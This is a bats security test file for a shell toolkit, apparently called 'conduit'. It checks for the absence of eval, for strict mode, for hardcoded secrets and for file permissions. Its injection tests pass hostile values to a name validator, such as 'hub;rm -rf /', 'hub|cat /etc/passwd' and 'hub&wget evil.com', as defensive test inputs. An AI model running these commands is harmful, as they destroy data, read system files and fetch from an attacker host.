#!/usr/bin/env bats
# tests/unit/test_security.bats
# Security-focused tests: no eval, strict mode, file permissions, injection prevention.

LIB_DIR="$(cd "$(dirname "$BATS_TEST_FILENAME")/../../lib" && pwd)"
SCRIPTS_DIR="$(cd "$(dirname "$BATS_TEST_FILENAME")/../.." && pwd)"

setup() {
    export HOME="$BATS_TMPDIR"
    export CONDUIT_CONFIG_DIR="$BATS_TMPDIR/test-sec-$$-$BATS_TEST_NUMBER"
    source "$LIB_DIR/common.sh"
}

teardown() {
    rm -rf "${CONDUIT_CONFIG_DIR:-}" 2>/dev/null || true
}

# ===========================================================================
# No eval in any lib module (critical security guarantee)
# ===========================================================================

@test "no eval in lib/common.sh" {
    ! grep -q '\beval\b' "$LIB_DIR/common.sh"
}

@test "no eval in lib/audit.sh" {
    ! grep -q '\beval\b' "$LIB_DIR/audit.sh"
}

@test "no eval in lib/registry.sh" {
    ! grep -q '\beval\b' "$LIB_DIR/registry.sh"
}

@test "no eval in lib/dns.sh" {
    ! grep -q '\beval\b' "$LIB_DIR/dns.sh"
}

@test "no eval in lib/tls.sh" {
    ! grep -q '\beval\b' "$LIB_DIR/tls.sh"
}

@test "no eval in lib/routing.sh" {
    ! grep -q '\beval\b' "$LIB_DIR/routing.sh"
}

# ===========================================================================
# No eval in any command script
# ===========================================================================

@test "no eval in conduit-preflight.sh" {
    ! grep -q '\beval\b' "$SCRIPTS_DIR/conduit-preflight.sh"
}

@test "no eval in conduit-setup.sh" {
    ! grep -q '\beval\b' "$SCRIPTS_DIR/conduit-setup.sh"
}

@test "no eval in conduit-register.sh" {
    ! grep -q '\beval\b' "$SCRIPTS_DIR/conduit-register.sh"
}

@test "no eval in conduit-deregister.sh" {
    ! grep -q '\beval\b' "$SCRIPTS_DIR/conduit-deregister.sh"
}

@test "no eval in conduit-status.sh" {
    ! grep -q '\beval\b' "$SCRIPTS_DIR/conduit-status.sh"
}

@test "no eval in conduit-monitor.sh" {
    ! grep -q '\beval\b' "$SCRIPTS_DIR/conduit-monitor.sh"
}

@test "no eval in conduit-certs.sh" {
    ! grep -q '\beval\b' "$SCRIPTS_DIR/conduit-certs.sh"
}

@test "no eval in conduit-dns.sh" {
    ! grep -q '\beval\b' "$SCRIPTS_DIR/conduit-dns.sh"
}

# ===========================================================================
# set -euo pipefail in every lib module
# ===========================================================================

@test "set -euo pipefail in lib/common.sh" {
    grep -q 'set -euo pipefail' "$LIB_DIR/common.sh"
}

@test "set -euo pipefail in lib/audit.sh" {
    grep -q 'set -euo pipefail' "$LIB_DIR/audit.sh"
}

@test "set -euo pipefail in lib/registry.sh" {
    grep -q 'set -euo pipefail' "$LIB_DIR/registry.sh"
}

@test "set -euo pipefail in lib/dns.sh" {
    grep -q 'set -euo pipefail' "$LIB_DIR/dns.sh"
}

@test "set -euo pipefail in lib/tls.sh" {
    grep -q 'set -euo pipefail' "$LIB_DIR/tls.sh"
}

@test "set -euo pipefail in lib/routing.sh" {
    grep -q 'set -euo pipefail' "$LIB_DIR/routing.sh"
}

# ===========================================================================
# set -euo pipefail in every command script
# ===========================================================================

@test "set -euo pipefail in conduit-preflight.sh" {
    grep -q 'set -euo pipefail' "$SCRIPTS_DIR/conduit-preflight.sh"
}

@test "set -euo pipefail in conduit-setup.sh" {
    grep -q 'set -euo pipefail' "$SCRIPTS_DIR/conduit-setup.sh"
}

@test "set -euo pipefail in conduit-register.sh" {
    grep -q 'set -euo pipefail' "$SCRIPTS_DIR/conduit-register.sh"
}

@test "set -euo pipefail in conduit-deregister.sh" {
    grep -q 'set -euo pipefail' "$SCRIPTS_DIR/conduit-deregister.sh"
}

@test "set -euo pipefail in conduit-status.sh" {
    grep -q 'set -euo pipefail' "$SCRIPTS_DIR/conduit-status.sh"
}

@test "set -euo pipefail in conduit-monitor.sh" {
    grep -q 'set -euo pipefail' "$SCRIPTS_DIR/conduit-monitor.sh"
}

@test "set -euo pipefail in conduit-certs.sh" {
    grep -q 'set -euo pipefail' "$SCRIPTS_DIR/conduit-certs.sh"
}

@test "set -euo pipefail in conduit-dns.sh" {
    grep -q 'set -euo pipefail' "$SCRIPTS_DIR/conduit-dns.sh"
}

# ===========================================================================
# No hardcoded credentials or API keys
# ===========================================================================

@test "no hardcoded passwords in lib modules" {
    ! grep -rqi 'password\s*=' "$LIB_DIR"/*.sh || \
    ! grep -rqi 'password\s*=\s*"[^"]\+"' "$LIB_DIR"/*.sh
}

@test "no hardcoded API keys in lib modules" {
    ! grep -rqi 'api_key\s*=' "$LIB_DIR"/*.sh || \
    ! grep -rqi 'api_key\s*=\s*"[^"]\+"' "$LIB_DIR"/*.sh
}

@test "no hardcoded secrets in command scripts" {
    ! grep -rqi 'secret\s*=\s*"[^"]\+"' "$SCRIPTS_DIR"/conduit-*.sh
}

# ===========================================================================
# Input validation prevents command injection
# ===========================================================================

@test "validate_service_name blocks backtick injection" {
    run validate_service_name '`id`'
    [ "$status" -eq 1 ]
}

@test "validate_service_name blocks dollar-paren injection" {
    run validate_service_name '$(whoami)'
    [ "$status" -eq 1 ]
}

@test "validate_service_name blocks semicolon injection" {
    run validate_service_name 'hub;rm -rf /'
    [ "$status" -eq 1 ]
}

@test "validate_service_name blocks pipe injection" {
    run validate_service_name 'hub|cat /etc/passwd'
    [ "$status" -eq 1 ]
}

@test "validate_service_name blocks ampersand injection" {
    run validate_service_name 'hub&wget evil.com'
    [ "$status" -eq 1 ]
}

@test "validate_service_name blocks glob character *" {
    run validate_service_name 'hub*'
    [ "$status" -eq 1 ]
}

@test "validate_service_name blocks glob character ?" {
    run validate_service_name 'hub?'
    [ "$status" -eq 1 ]
}

@test "validate_service_name blocks path traversal" {
    run validate_service_name '../../etc/passwd'
    [ "$status" -eq 1 ]
}

# ===========================================================================
# File permission enforcement
# ===========================================================================

@test "umask 077 called via set_safe_umask" {
    set_safe_umask
    [ "$(umask)" = "0077" ]
}

@test "set_safe_umask creates files with 600" {
    set_safe_umask
    mkdir -p "$CONDUIT_CONFIG_DIR"
    touch "$CONDUIT_CONFIG_DIR/test_file"
    local perms
    perms="$(stat -c '%a' "$CONDUIT_CONFIG_DIR/test_file" 2>/dev/null || stat -f '%A' "$CONDUIT_CONFIG_DIR/test_file" 2>/dev/null)"
    [ "$perms" = "600" ]
}
